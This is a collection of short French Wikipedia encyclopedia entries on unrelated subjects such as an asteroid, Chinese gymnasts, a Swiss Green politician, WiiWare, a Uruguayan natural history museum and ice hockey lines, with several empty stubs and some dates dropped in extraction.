<doc id="3214326" url="https://fr.wikipedia.org/wiki?curid=3214326" title="(39427) Charlottebrontë">
(39427) Charlottebrontë

(39427) Charlottebrontë est un astéroïde de la ceinture principale. Il porte le nom de la romancière britannique Charlotte Brontë (1816-1855).
Il a été découvert le à l'observatoire Palomar par le trio d'astronomes néerlandais Cornelis Johannes van Houten, Ingrid van Houten-Groeneveld et Tom Gehrels.
Sa désignation provisoire était 3360 T-2.

</doc>
<doc id="3214328" url="https://fr.wikipedia.org/wiki?curid=3214328" title="Mamadou Lamine Keita">
Mamadou Lamine Keita



</doc>
<doc id="3214329" url="https://fr.wikipedia.org/wiki?curid=3214329" title="Kneževo">
Kneževo

Kneževo est un topopnyme qui peut désigner :

</doc>
<doc id="3214333" url="https://fr.wikipedia.org/wiki?curid=3214333" title="Caterina Zandonella">
Caterina Zandonella

Caterina Zandonella, connue sous le pseudonyme de Cat Zazà, née en 1981, est une illustratrice italienne née au à Udine. Elle vit et travaille en France, en région parisienne.

</doc>
<doc id="3214334" url="https://fr.wikipedia.org/wiki?curid=3214334" title="Les Belles Manières">
Les Belles Manières

Les Belles Manières est un film français réalisé par Jean-Claude Guiguet et sorti en 1979.
Synopsis.
Répondant à une offre d'emploi, Camille arrive à Paris. Son employeuse, Hélène Courtray, l'accueille.

</doc>
<doc id="3214336" url="https://fr.wikipedia.org/wiki?curid=3214336" title="Association de gestion et de comptabilité">
Association de gestion et de comptabilité

L'Association de gestion et de comptabilité (AGC) est en France, une association loi de 1901 née à la suite de l'article 5 de l'ordonnance 2004-279 du , visant à remplacer les Centres de gestion agréés et habilités (CGAH) et les centre de gestion agréé (CGA).
Domaine d'activité.
Le domaine d'activité des associations de gestion et de comptabilité (AGC) est le même que celui des cabinets d'expertise-comptable à l'exception des missions de commissariat aux comptes. À ce titre, les AGC prennent en charge l'ensemble des missions comptables allant de l'enregistrement des factures jusqu'à l'établissement de l'état de la situation financière (bilan et compte de résultat). Elles peuvent également effectuer des missions juridiques telles que la rédaction de statuts de sociétés ou prestations sociales telles que la rédaction de contrats de travail, bulletin de paie et déclarations (déclarations d'embauche, DADS...).
Il faut également savoir que " l'activité d'expertise comptable peut également être exercée au sein d'associations de gestion et de comptabilité, qui ne sont pas membres de l'ordre des experts-comptables " selon l'ordonnance n°45-2138 du - article 7 ter. Selon cette même ordonnance (cf. article 7 ter, alinéa 4), Les associations ayant pour objet l'activité d'expertise-comptable sont seules habilitées à utiliser l'appellation " association de gestion et de comptabilité ".
Les AGC sont inscrites à l'Ordre des experts-comptables au même titre que les experts-comptables libéraux. Elles ont désormais les mêmes droits et obligations que tout autre cabinet d'expertise comptable notamment l'obligation de compter dans ses effectifs un expert-comptable pour un certain nombre de collaborateurs comptables (article 7 ter de l'ordonnance n°45-2138).
Origine des associations de gestion.
La majorité des AGC sont créées par des organisations professionnelles ou par des chambres consulaires (chambre de commerce et d'industrie, chambre de métiers et de l'artisanat, chambre d'agriculture), il s'agit en général d'un service annexe qui par la suite, a pris la forme de cabinets de comptabilité à part entière.
Il existe quatre principaux réseaux :

</doc>
<doc id="3214342" url="https://fr.wikipedia.org/wiki?curid=3214342" title="Grossmann (montagne)">
Grossmann (montagne)

Le mont Grossmann est un sommet du massif des Vosges situé en France, à la limite entre les départements du Bas-Rhin et de la Moselle (dont il est le point culminant), s'élevant à d'altitude. Il se trouve respectivement entre les communes de Lutzelhouse et Walscheid.
C'est sur son versant septentrional que la Zorn prend sa source.

</doc>
<doc id="3214343" url="https://fr.wikipedia.org/wiki?curid=3214343" title="Zou Kai">
Zou Kai

Zou Kai, (chinois simplifié : 邹凯; chinois traditionnel : 鄒凱; pinyin : Zōu Kǎi), né le à Luzhou, dans la province du Sichuan, est un gymnaste chinois. Ses agrès de prédilection sont le sol et la barre fixe. Il est quintuple champion olympique, notamment double tenant du titre (2008,2012) au concours par équipes avec la Chine et au sol en individuel.
Biographie.
Né dans une famille d'ouvriers, il commence la gymnastique très jeune. En 2001, il entre dans l'équipe provinciale du Sichuan et en , il est sélectionné dans l'équipe nationale chinoise de gymnastique.
Il est l'athlète chinois le plus titré en termes de médailles d'or olympiques (5 en deux participations aux Jeux olympiques). 

</doc>
<doc id="3214344" url="https://fr.wikipedia.org/wiki?curid=3214344" title="Cheng Fei">
Cheng Fei

Cheng Fei est une gymnaste chinoise, née le à Huangshi, dans la province du Hubei.
Biographie.
Cheng Fei a été championne du monde de gymnastique artistique au sol en 2006, et championne du monde au saut en 2005, 2006 et 2007.
Lors des championnats du monde de gymnastique artistique 2006, elle a remporté la médaille d'or du concours général par équipes, en compagnie de Zhou Zhuoru, Zhang Nan, Pang Panpan, He Ning et Li Ya.
Aux Jeux olympiques d'été de 2008, elle a une nouvelle fois remporté la médaille d'or du concours par équipes, cette fois-ci en compagnie de Yang Yilin, Jiang Yuyuan, Deng Linlin, He Kexin et Li Shanshan. Elle y décroche aussi deux médailles de bronze dans les épreuves du saut de cheval et de la poutre.

</doc>
<doc id="3214347" url="https://fr.wikipedia.org/wiki?curid=3214347" title="Ferrari (automobile)">
Ferrari (automobile)



</doc>
<doc id="3214350" url="https://fr.wikipedia.org/wiki?curid=3214350" title="La Machine (film, 1977)">
La Machine (film, 1977)

La Machine est un film français de Paul Vecchiali, sorti en 1977.
Synopsis.
Pierre Lentier, est jugé pour avoir tué une fillette dont il tentait d'abuser. Son procès se mue en débat autour du thème de la peine de mort. Tous les moyens sont bons pour instruire l'enquête et pour rechercher la vérité et les motivations de l'accusé. Entre non-dits et "non-dicibles", meurtrier, commissaires, psychiatres, famille, proches, voisins, badauds, grand public oscillent au prix de quelques interprétations qui embrument une vérité qui s'avérera tout aussi simple qu'insupportable.
Distribution.
Avec également la voix de Julien Guiomar.
Édition.
Le film, sous le titre "La Machine", est édité en cassette VHS par la société "Fil à Film" en 1980. Il n'a pas initialement fait l'objet d'une réédition en DVD, mais a ultérieurement fait l'objet d'une coédition comprenant livre+extraits+DVD+boni par les Éditions de l'Œil et la Traverse en 2015.

</doc>
<doc id="3214351" url="https://fr.wikipedia.org/wiki?curid=3214351" title="Yang Yilin">
Yang Yilin

Yang Yilin (née le à Guangdong en Chine) est une gymnaste chinoise.
Biographie.
Aux Jeux olympiques d'été de 2008, en gymnastique artistique, elle a remporté la médaille d'or du concours général par équipes, en compagnie de Cheng Fei, Jiang Yuyuan, Deng Linlin, He Kexin et Li Shanshan. Elle a également remporté deux médailles de bronze : une aux barres asymétriques, et une au concours général individuel.
Aux championnats du monde de gymnastique artistique 2007, elle a remporté deux médailles : une en argent, au concours général par équipes, et une en bronze, aux barres asymétriques.

</doc>
<doc id="3214356" url="https://fr.wikipedia.org/wiki?curid=3214356" title="André Dehertoghe">
André Dehertoghe

André Dehertoghe est un athlète belge, coureur de demi-fond né le à Louvain et mort le . Surnommé "Ratteke", il fut un des spécialistes européens du m. Il a régulièrement servi de lièvre pour Gaston Roelants et Emile Puttemans. Il était l'époux de la patineuse à roulettes de vitesse, plusieurs fois championne du monde Annie Lambrechts.

</doc>
<doc id="3214364" url="https://fr.wikipedia.org/wiki?curid=3214364" title="Gashaw Melese">
Gashaw Melese



</doc>
<doc id="3214366" url="https://fr.wikipedia.org/wiki?curid=3214366" title="Poličnik">
Poličnik

Poličnik est un village et une municipalité située dans le comitat de Zadar, en Croatie. Au recensement de 2001, la municipalité comptait habitants, dont 98,50 % de Croates et le village seul comptait habitants.
Localités.
La municipalité de Poličnik compte 10 localités :

</doc>
<doc id="3214367" url="https://fr.wikipedia.org/wiki?curid=3214367" title="Policnik">
Policnik



</doc>
<doc id="3214377" url="https://fr.wikipedia.org/wiki?curid=3214377" title="Alexianne Castel">
Alexianne Castel

Alexianne Castel, née le à Bordeaux, est une nageuse française spécialiste du dos.
Elle mesure . Elle participe à ses premiers Jeux olympiques lors des Jeux de Pékin en 2008 où elle réalise une demi-finale. Spécialiste du dos, mais performante aussi sur dos, elle a démontré son statut international en remportant son premier titre mondial sur cette distance lors des championnats du monde en petit bassin à Dubaï en , dont elle détient toujours le record de France du 200m dos en petit bassin . Entraînée au pôle France de Font-Romeu par Richard Martinez, elle est sacrée championne d'Europe grand bassin du 200 m dos en 2012 à Debrecen. Elle participe à ses deuxièmes Jeux Olympiques à Londres en 2012 où elle performe jusqu'en finale. Elle est aujourd'hui Experte en Protection Sociale du dirigeant d'entreprise au sein d'un grand cabinet Bordelais ARGAM CONSEILS.

</doc>
<doc id="3214382" url="https://fr.wikipedia.org/wiki?curid=3214382" title="Berger de la Maremme et des Abruzzes">
Berger de la Maremme et des Abruzzes



</doc>
<doc id="3214383" url="https://fr.wikipedia.org/wiki?curid=3214383" title="Berger de la Maremme">
Berger de la Maremme



</doc>
<doc id="3214385" url="https://fr.wikipedia.org/wiki?curid=3214385" title="M.O.L.">
M.O.L.



</doc>
<doc id="3214387" url="https://fr.wikipedia.org/wiki?curid=3214387" title="Laurent Rebeaud">
Laurent Rebeaud

Laurent Rebeaud, né le à Lucens (originaire d'Yvonand et de Rovray) et décédé le à Savigny, est un journaliste et homme politique suisse, membre des Verts.
Biographie.
Origines et famille.
Laurent Rebeaud naît le le à Lucens, dans le canton de Vaud. Il est originaire d'Yvonand et de Rovray, dans le même canton.
Son père est pasteur. Il officie à Naples avant la Seconde Guerre mondiale.
Divorcé d'une première épouse, cantatrice, dont il a deux enfants, il se remarie en 1992 en 1993 et a un troisième enfant. Sa fille aînée, , est la fondatrice en 1993 à Hô Chi Minh-Ville, au Vietnam, de la Maison Chance, une organisation non gouvernementale qui aide .
Études.
Il fait des études de lettres à l'Université de Lausanne, conclues par une licence. Pendant cette période, il correspond avec Denis de Rougemont.
Parcours professionnel.
Laurent Rebeaud enseigne la géographie de 1969 à 1971.
Il exerce ensuite la profession de journaliste, s'installant à Genève après ses débuts à la "Gazette de Lausanne". Il travaille pour la radio et la télévision suisse romande de 1970 à 1980 avant de devenir responsable de l'information en français du WWF Suisse jusqu'en 1989. Il est licencié de ce dernier poste en raison d'un manque allégué de disponibilité.
Il est ensuite rédacteur du journal de l'Association transports et environnement (ATE) de 1990 à 1994. De 1994 à 1998, il est rédacteur en chef du journal "Coopération", l'organe de presse de Coop, et vit alors à Bâle.
Il déménage ensuite dans le canton de Vaud, où il est nommé en , avec entrée en fonction en mai 1997, délégué à l'information du gouvernement vaudois. Il dirige le Bureau d'information et de communication du canton de 1998 à 2012 ou 2013.
Parcours politique.
En 1983, Laurent Rebeaud participe à la fondation du Parti écologiste genevois, avant de contribuer à celle de la Fédération des partis écologistes de Suisse et d'en devenir le premier président jusqu'en 1985.
Il siège au Grand Conseil du canton de Genève de 1985 à 1986 et de 1993 à 1994. Il est par ailleurs candidat en 1985 et 1989 à l'élection au Conseil d'État du canton de Genève.
Il est élu en 1983 au Conseil national et y siège jusqu'en . Ne pouvant briguer un quatrième mandat en raison des statuts de son parti, il laisse son siège pour la fin de la législature à sa colistière Fabienne Bugnon.
Il est élu à l'Assemblée constituante vaudoise (1999-2002), chargée de rédiger une nouvelle constitution cantonale. Il entre ensuite au Bureau des Verts vaudois, dont il est vice-président puis président. Il retrouve un mandat électif au printemps 2011 en étant élu au Conseil communal de Lausanne.
Autres activités.
Il est membre d'un groupe de gospel, les .
Mort.
Laurent Rebeaud meurt d'un accident de moto le à Savigny, dans le canton de Vaud, à l'âge de 68 ans.

</doc>
<doc id="3214388" url="https://fr.wikipedia.org/wiki?curid=3214388" title="WiiWare">
WiiWare

WiiWare était la plate-forme de téléchargement de jeux vidéo de la console Wii, accessible à partir de la chaîne boutique Wii. Il était possible d'y acheter des jeux à l'aide de Nintendo Points, issus de studios connus tout comme de studios indépendants, ainsi que du contenu additionnel. Les développeurs avaient pour seule contrainte technique la nécessité de produire un jeu de moins de . Ils gardaient ainsi, entre autres, la possibilité d'utiliser les services en ligne comme le Nintendo Wi-Fi Connection et le WiiConnect24 ainsi que les Mii. 
Le WiiWare est lancé le au Japon, le en Amérique du Nord le en Europe sur Wii, et le lors de la sortie de la Wii U.
Avec l'annonce la fermeture de la chaîne Boutique Wii pour le , il n'est plus possible d'acheter des jeux WiiWare à partir de cette date.
Historique.
Le WiiWare a été annoncé par Nintendo en juin 2007, alors que quelques rumeurs circulaient déjà. Il est présenté comme une possibilité pour les petits développeurs de réaliser des jeux sans déployer de grands moyens.
La plate-forme de téléchargement WiiWare a été mise en route le au Japon, le en Amérique du Nord avec six jeux, et le en Europe avec huit jeux.
Lors du lancement du service, la plupart des critiques spécialisées se sont accordées à dire que "LostWinds" était le meilleur investissement parmi les titres disponibles à l'époque. D'autres jeux connaîtront un grand succès critique, comme "World of Goo", qui a même remporté le prix d’"IGN" du meilleur jeu Wii de 2008.
Depuis le mois de , Nintendo a lancé une campagne de promotion pour le service en proposant des versions de démonstrations gratuites de certains titres disponibles. Ces démonstrations sont dans un premier temps disponibles en téléchargement jusqu'au .
Le , Nintendo annonça la fermeture de la chaîne Boutique Wii pour le , l'utilisateur ne pouvant plus acheter de nouveaux jeux WiiWare au-delà de cette date.
Jeux WiiWare.
Le service proposait près de 300 jeux, et la mise à jour du catalogue en Europe se faisait exclusivement le vendredi comme pour le DSiWare et la Console virtuelle.
Une fois téléchargés, les jeux se retrouvent sur le menu Wii. Si la mémoire de la console est pleine, l'utilisateur a la possibilité de transférer ces jeux sur une carte SD, et peut les démarrer depuis ce support externe.
Le mode d'emploi de chaque jeu WiiWare était directement hébergé sur la chaîne boutique Wii, au contraire des autres logiciels disponibles sur la chaîne boutique. 
Il arrivait parfois que certains jeux WiiWare reçoivent des mises à jour afin de corriger d'éventuels problèmes. Ce sont les seuls jeux Wii à pouvoir recevoir des correctifs.
Conditions d'utilisation.
Comme les jeux console virtuelle, les jeux WiiWare sont liés à la console sur laquelle ils ont été achetés, en cas de changement de matériel, les jeux ne peuvent pas être transférés. Il faut les racheter sauf si vous changez votre console via le SAV de Nintendo, auquel il faudra impérativement préciser que vous possédiez des jeux WiiWare sur votre ancienne console.
Prix.
Le prix des jeux était fixé par les développeurs, il pouvait varier de 500 à 2000 Nintendo Points, soit de 5 à .

</doc>
<doc id="3214390" url="https://fr.wikipedia.org/wiki?curid=3214390" title="Comprensorio">
Comprensorio



</doc>
<doc id="3214392" url="https://fr.wikipedia.org/wiki?curid=3214392" title="Ngarigo">
Ngarigo

Le peuple Ngarigo est une population aborigène d'Australie qui vivait au sud-est de la région de Canberra.
Selon Norman Tindale dans son livre sur les Aborigènes d'Australie en 1974, les zones précises dans lesquelles vivaient les Ngarigos étaient les suivantes :
Le site web de la ville de Cooma indique que les deux principaux groupes aborigènes de la région de Monaro étaient les Ngarigos qui vivaient sur le plateau et les Woguls ou Wolgalus qui habitaient les montagnes

</doc>
<doc id="3214403" url="https://fr.wikipedia.org/wiki?curid=3214403" title="Musée national d'histoire naturelle de l'Uruguay">
Musée national d'histoire naturelle de l'Uruguay

Le musée national d'histoire naturelle de l'Uruguay (en espagnol, "Museo Nacional de Historia Natural de Uruguay") est un musée de l’Uruguay fondé en 1837 et situé à Montevideo. En 2001 il est passé à être administré, conjointement avec le (fondé, lui, en 1981) par une entité nommée « Museos Nacionales de Historia Natural y Antropología ». En 2004 une décision présidentielle a renommé cette institution en un seul musée nommé , mais dans la réalité des faits le musée d'histoire naturelle a continué de s'appeler .
Historique.
Ce musée d'histoire naturelle est créé en 1837, sept ans seulement après la première constitution de l'Uruguay. Le gouvernement charge une commission notamment constitué de naturalistes comme Teodoro Miguel Vilardebó (1803-1857) et Dámaso Antonio Larrañaga (1771-1848) de constituer des collections et la bibliothèque du futur musée. Parmi les autres membres de la commission, on peut citer Ramon Masini, Bernardo Prudencio Berro Larrañaga (1803-1868), Manuel Errazquín et Christopher Salvañach.
La première mission scientifique organisée par le Musée l'est dès 1837 et compte parmi ses membres Vilardebó, Berro Larrañaga et Arsène Isabelle (1807-1888). Il s’agit de trouver des fossiles dans le silex de la province de Canelones.
Après ces débuts prometteurs, la direction du Musée est confiée au poète et homme de lettres Francisco Esteban Acuña de Figueroa (1791-1862), les activités déclinent presque complètement et les collections d’origine, négligées, sont en partie perdues, de même que la bibliothèque.
Plusieurs tentatives de réorganisation sont faites, en vain. Carlos Berg (1843-1902) est nommé alors en 1890. Il quitte le musée en 1892 car il obtient la direction du Musée argentin des sciences naturelles. Il est alors remplacé par le botaniste Jose Arechavaleta y Balpardo (1838-1912). Le gouvernement acquiert, en 1915, la bibliothèque (1 500 volumes) et l’herbier (7 000 espèces) de ce dernier. Les directeurs qui suivent continuent de maintenir la direction scientifique de l’établissement : Garibaldi José Devincenzi (1882-1943) qui entame un inventaire des vertébrés de l’Uruguay, Ergasto Héctor Cordero (1890-1951) qui initie l’étude des invertébrés, le botaniste Carlos María Diego Enrique Legrand (1901-1982), le spécialiste des mollusques et amphibiens Miguel Angel Klappenbach (1920-2000), le spécialiste des lichens Héctor Saúl Osorio Rial (1928-)...
L’une des expéditions la plus célèbre est celle organisé dans l’Orénoque en 1957.

</doc>
<doc id="3214404" url="https://fr.wikipedia.org/wiki?curid=3214404" title="Museo Nacional de Historia Natural">
Museo Nacional de Historia Natural



</doc>
<doc id="3214405" url="https://fr.wikipedia.org/wiki?curid=3214405" title="Museo Nacional de Historia Natural y Antropologia">
Museo Nacional de Historia Natural y Antropologia



</doc>
<doc id="3214407" url="https://fr.wikipedia.org/wiki?curid=3214407" title="Museo Nacional de historia natural y antropologia">
Museo Nacional de historia natural y antropologia



</doc>
<doc id="3214411" url="https://fr.wikipedia.org/wiki?curid=3214411" title="Compagnie du rideau gris">
Compagnie du rideau gris

La Compagnie du rideau gris est une troupe de théâtre fondée à Marseille en 1931 par Louis Ducreux.
Historique.
Réunissant un groupe de jeunes étudiants marseillais passionnés de théâtre, cette compagnie, l'une des premières troupes de décentralisation existantes en France, avait résolu d'apporter en province le même esprit artistique que celui du Cartel des Quatre (Louis Jouvet, Georges Pitoëff, Charles Dullin et Gaston Baty).
Louis Ducreux, bientôt rejoint par André Roussin, codirigea pendant ces douze années d'activité la compagnie qu'il avait fondée.
Sous l'impulsion d'Henri Fluchère (1898-1987), la troupe mit à son répertoire plusieurs pièces élisabéthaines alors peu connues en France. C'est ainsi que furent montées, outre "La Tempête" de Shakespeare, "L'Opéra des Gueux" de John Gay, ou encore "La duchesse d'Amalfi" de John Webster, pièce que la compagnie vint jouer à Paris à la Comédie des Champs-Élysées à l'automne 1937.
Les principes.
Le premier programme édité par la compagnie comportait un texte de Louis Ducreux intitulé Le Rideau Gris, son présent, son devenir. On pouvait y lire ceci :
« Dans une circulaire adressée il y a deux mois aux hommes de bonne volonté, nous demandions deux cents adhérents pour pouvoir donner vie à notre club. Ce nombre, aujourd'hui atteint puis dépassé, nous permet de tenir nos engagement en créant à Marseille le premier club théâtral d'avant-garde.
Notre premier devoir sera donc de remercier tous ceux qui, nous faisant confiance, sont venus à nous, ont osé être les premiers adhérents, ont osé en recruter d'autres, enrôler leurs amis, créer un mouvement et permettre à un organisme nouveau de faire ses preuves.
Mais nous leur demanderons davantage, car nous ne pourrons aborder les vastes réalisations que nous projetons qu'avec un groupe bien plus important. Celui existant aujourd'hui ne doit être qu'un noyau autour duquel se développera une association puissante pouvant donner à Marseille les représentations scéniques dont, seul en France, Paris bénéficia jusqu'à maintenant, alors qu'à l'étranger la plupart des villes importantes connaissent des spectacles de valeur.
Décentraliser l'art théâtral, tel doit être notre but. Nos adhérents actuels doivent nous aider à le réaliser. »

</doc>
<doc id="3214412" url="https://fr.wikipedia.org/wiki?curid=3214412" title="Personnages des Soprano - Famille DiMeo">
Personnages des Soprano - Famille DiMeo



</doc>
<doc id="3214414" url="https://fr.wikipedia.org/wiki?curid=3214414" title="Nieder-Olm">
Nieder-Olm

Nieder-Olm est une petite ville de la Hesse rhénane dans la Rhénanie-Palatinat (Allemagne).
Geographie.
Nieder-Olm est traversée par la rivière Selz.
Histoire.
Nieder-Olm est citée pour la première fois dans un texte de l'archevêque de Mayence Hatton daté de 899. Il donnée la femme de Arnulf de Carinthie biens au territoire.
Pendant la guerre de la Ligue d'Augsbourg Nieder-Olm fut pillée par les troupes royales françaises.
En 1792, les troupes révolutionnaires françaises occupent la rive gauche du Rhin pendant la république de Mayence. Nieder-Olm devient provisoirement française en 1802 et fit chef-lieu du Canton de Niederolm. Après les guerres de libération napoléoniennes, la ville fit partie de Grand-duché de Hesse.
Quand Mont-Tonnerre, qui avait pour chef-lieu Mayence, était un ancien département français, une extension de la Route nationale 3 (France) Sarrebruck à Mayence fut construite entre 1806 et 1811. Aujourd'hui encore, à Nieder-Olm, on trouve des rues appelées « Pariser Strasse » (rue de Paris) parallèlement l'autoroute 63.
Liaison routière.
À 10 kilomètres au sud de Mayence, relié au réseau autoroutier par la Bundesautobahn 63. Arrêt régulier des trains de la ligne Mayence-Alzey. Des pistes cyclables relient Nieder-Olm à Ingelheim (Rhin), Mayence et Alzey.
Jumelages.
Nieder-Olm est jumelée avec des villes du monde entier :

</doc>
<doc id="3214415" url="https://fr.wikipedia.org/wiki?curid=3214415" title="Miguel Angel Klappenbach">
Miguel Angel Klappenbach

Miguel Angel Klappenbach (-) est un herpétologiste et un malacologiste uruguayen, né le à Dolores (Uruguay) et mort le à Montevideo.
Biographie.
Son père travaille pour la banque nationale et la famille Klappenbach change souvent de ville. Miguel Angel s’engage dans la même profession que son père et travaille dans un service d’assurance gouvernemental à Artigas tout en donnant des cours d’histoire naturelle dans une école secondaire.
En 1955, il part s’installer à Montevideo où il devient assistant en zoologie et assure la conservation des collections d’herpétologie et de malacologie au Museo Nacional de Historia Natural y Antropología. Il organise deux importantes expéditions au Brésil (1955) et au Venezuela (1957). Doyen de la Facultad de Humanidades y Ciencias (faculté des humanités et des sciences), il y organise divers enseignements scientifiques. Il prend sa retraite en 1984 mais poursuit ses recherches scientifiques. Il est l’auteur de 75 publications scientifiques.

</doc>
<doc id="3214419" url="https://fr.wikipedia.org/wiki?curid=3214419" title="José Ángel Egido">
José Ángel Egido

José Ángel Egido, né en 1951 à Redondela, province de Pontevedra, Espagne est un acteur espagnol.
Biographie.
Malgré sa réputation qui s'acquiert petit à petit grâce au cinéma et au théâtre, la popularité lui arrive réellement lorsqu'il joue le rôle de Borja, le chef sauvage de la série télévisée "Médecin de famille".
Plus tard, sa participation au film "Lundi au soleil", de Fernando Leon d'Aranoa, lui a valu un Prix Goya.
Sa filmographie inclut des films comme "L'amour nuit sérieusement à la santé", "Quand tu retourneras à mes côtés", "Ouvre les yeux", "La Nuit du frère", "Elsa et Fred", "Heures de lumière" et "Les Tournesols des aveugles".
À la télévision, il participe à la télécomédie galicienne de la TVG. Il eut aussi des collaborations dans des séries à succès comme "Hopital Central", "Le Commissaire", "Les Policiers", "Dans le cœur de la rue", "Sept Vies", ou encore "Un pas en avant" (dans ce dernier, il joua aux côtés de Miguel Ángel Muñoz).
Filmographie.
"Personnages fixes :"
"Personnages épisodiques :"

</doc>
<doc id="3214421" url="https://fr.wikipedia.org/wiki?curid=3214421" title="Lionel Cottu">
Lionel Cottu

Lionel Cottu est un journaliste politique français, né le .
Il a travaillé chez France 3, où il a été notamment chroniqueur dans les émissions politiques de Christine Ockrent, "France Europe Express" et "Duel sur la 3" et a été directeur éditorial d'ELEPHANT AT WORK.
Il est depuis 2013 

</doc>
<doc id="3214424" url="https://fr.wikipedia.org/wiki?curid=3214424" title="Acta diurna">
Acta diurna



</doc>
<doc id="3214425" url="https://fr.wikipedia.org/wiki?curid=3214425" title="Acta senatus">
Acta senatus



</doc>
<doc id="3214426" url="https://fr.wikipedia.org/wiki?curid=3214426" title="Defauconpret">
Defauconpret



</doc>
<doc id="3214427" url="https://fr.wikipedia.org/wiki?curid=3214427" title="Glenn L.Martin Company">
Glenn L.Martin Company



</doc>
<doc id="3214431" url="https://fr.wikipedia.org/wiki?curid=3214431" title="Hichem Chaabane">
Hichem Chaabane

Hichem Chaabane (né le à Blida) est un coureur cycliste algérien. Son père, Abdelkader Chaâbane, était également coureur cycliste.
Biographie.
En , alors qu'il n'a que 18 ans, Hichem Chaabane est sélectionné pour l'Algérie pour les championnats du monde B en Afrique du Sud, et y obtient la cinquième place. Deux semaines plus tard, il est et premier algérien de la course en ligne des Jeux africains. 
En 2008, il rejoint l'équipe continentale sud-africaine Konica Minolta-Bizhub. Il participe à plusieurs courses en Afrique du Sud, mais aussi à des épreuves de la Coupe des Nations Espoirs. Il est le seul cycliste algérien sélectionné pour les Jeux olympiques à Pékin, abandonnant avant l'arrivée. Il est également sélectionné pour les Championnats du monde espoirs, puis pour les Championnats d'Afrique de cyclisme. Au cours de ces derniers, il prend la cinquième place de la course en ligne, terminant meilleur coureur de moins de 23 ans, ce qui lui vaut le titre de champion d'Afrique sur route espoirs. 
Chaabane rejoint en 2009 l'équipe MTN, mais n'y est pas conservé en 2010.
Le , il est provisoirement suspendu à la suite de résultats positifs à deux substances interdites (EPO et Glucocorticoïdes). Depuis le début de l'année 2015, il comptait sept victoires sur les courses UCI, toutes obtenues en Algérie, ce qui le classait troisième au classement des coureurs les plus victorieux derrière Alexander Kristoff et Richie Porte. Il est suspendu pour une durée de 18 mois à partir du pour un contrôle positif à deux substances interdites. Tous ses résultats à partir du inclus sont annulés.

</doc>
<doc id="3214432" url="https://fr.wikipedia.org/wiki?curid=3214432" title="Edmund Conen">
Edmund Conen

Edmund Conen (né le à Ürzig, mort le à Leverkusen) était un footballeur allemand.
Biographie.
Il a joué en équipe d'Allemagne. Il évoluait au poste d'attaquant. Il est considéré comme l'un des meilleurs footballeurs des années 1930. Lors de la Coupe du monde de football 1934, il marqua quatre buts (et fut deuxième meilleur buteur de la compétition), dont un triplé contre la Belgique en huitième de finale, et un contre l'Autriche en petite finale, offrant la troisième place à son pays. En 28 sélections il marqua pas moins de 27 buts. 

</doc>
<doc id="3214435" url="https://fr.wikipedia.org/wiki?curid=3214435" title="Beach handball">
Beach handball

Le beach handball est un sport collectif dérivé du handball en salle mais qui se pratique sur du sable (d'où son nom, "beach" signifiant plage en anglais). Le beach handball oppose deux équipes de quatre joueurs (dont un gardien de but) qui doivent lancer un ballon en plastique dans le but de leurs adversaires. Comme au handball, le nombre de pas balle en main est limité à trois. Les buts jugés « spectaculaires » (360°, Kung fu, tir du gardien, penalty) donnent deux points. 
Le terrain est un rectangle de sur 12, et le but est de dimensions identiques à celui du handball ( sur 2). La partie se dispute en deux sets de dix minutes chacun, avec but en or en cas d'égalité à la fin du temps réglementaire. Si les deux équipes ont remporté chacune un set, elles sont départagées à l'aide d'une séance de tirs au but.
Le beach handball diffère du sandball, un autre sport dérivé du handball qui se pratique sur le sable. Mais ce dernier, peu pratiqué hors du monde francophone et non reconnu par la Fédération internationale de handball, se veut d'abord un sport récréatif.

</doc>
<doc id="3214438" url="https://fr.wikipedia.org/wiki?curid=3214438" title="Ligne (hockey sur glace)">
Ligne (hockey sur glace)

Au hockey sur glace, le rythme et l'intensité de jeu sont particulièrement élevés. Les joueurs peuvent donc être remplacés à tout moment du match, ce qui permet de garder toujours en jeu des participants au meilleur de leur forme. Pour faciliter l'organisation de ces changements, on regroupe les joueurs par groupes, appelés lignes ou trios, qui rentrent et sortent du jeu en même temps (durant le même temps de jeu ou "shift"), sur ordre de l'entraîneur. Ces changements de ligne ont lieu fréquemment : un temps de jeu dure en moyenne entre 30 secondes et 1 minute.
Les lignes sont généralement stables, afin de renforcer les automatismes entre les joueurs d'une même ligne ("linemates" en anglais), mais peuvent toutefois être modifiées par l'entraîneur s'il n'est pas satisfait de leur rendement, même pendant le déroulement d'un match.
Une ligne d'attaque est constituée de trois joueurs, d'où le nom de "trio" : un centre, et deux ailiers. Une ligne défensive est constituée de deux défenseurs. Certains entraîneurs mettent aussi en place des « unités spéciales », qui entrent en jeu lors des phases de supériorité ou d'infériorité numériques. Ces unités possèdent un style de jeu différent, adapté à la situation.
Chaque équipe de hockey dispose généralement de quatre lignes d'attaque, et quatre lignes de défense. Cependant, ceci n'est pas une obligation. En LNH par exemple, les équipes n'ont que trois lignes défensives.
À cause du rythme rapide et intense du hockey sur glace de haut niveau, les joueurs sont fréquemment remplacés à chaque temps de jeu par des coéquipiers, généralement par groupe ayant l'habitude de jouer ensemble, appelé "linemates". Les "linemates" peuvent changer tout au long du match à la discrétion de l'entraîneur.
Une ligne d'avants se compose d'un ailier gauche, d'un centre, d'un ailier droit. Une paire de défenseurs jouant ensemble s'appelle une ligne bleue ou "blue line pair". Il y a généralement quatre lignes d'avants, totalisant douze individus, et trois lignes de défenseurs, totalisant six individus, utilisées au cours du match.
La première ligne est en principe composée des meilleurs joueurs offensifs de l'équipe. Les équipes reposent fortement sur cette ligne qui génère la plupart des points. Ce sont ces joueurs, parmi tous les avants, qui totalisent le plus grand nombre de minutes de jeu.
La deuxième ligne est généralement composée de joueurs offensifs de second rang, elle vient ajouter un supplément d'attaque à celle de la première ligne. Les meilleurs joueurs (habituellement en première ligne) peuvent occasionnellement jouer en deuxième ligne pour alourdir le score et en compliquant la tâche de la défense adverse.
La troisième ligne est souvent appelée la « ligne de contrôle » ou "checking line", et est généralement constituée d'avants au profil plus défensif. Cette ligne joue souvent en face de la première ou de la deuxième ligne adverse afin de réduire leurs occasions de buts et de les user physiquement. La troisième ligne apporte moins d'attaque que la première ou deuxième ligne mais en principe plus que la quatrième.
La quatrième ligne est habituellement appelée la « ligne d'énergie » ou "energy line", d'une part parce qu'elle permet aux autres joueurs de se reposer, et d'autre part parce qu'elle est très « physique », apportant à leur équipe un soutien émotionnel de par leur engagement, la rendant plus énergique. Elle est généralement composée de joueurs rugueux, laborieux, ayant un potentiel de buteur extrêmement limité, mais avec un jeu physiquement puissant et, autant que possible, une solide technique de patinage. C'est cette ligne qui joue le moins longtemps.

</doc>
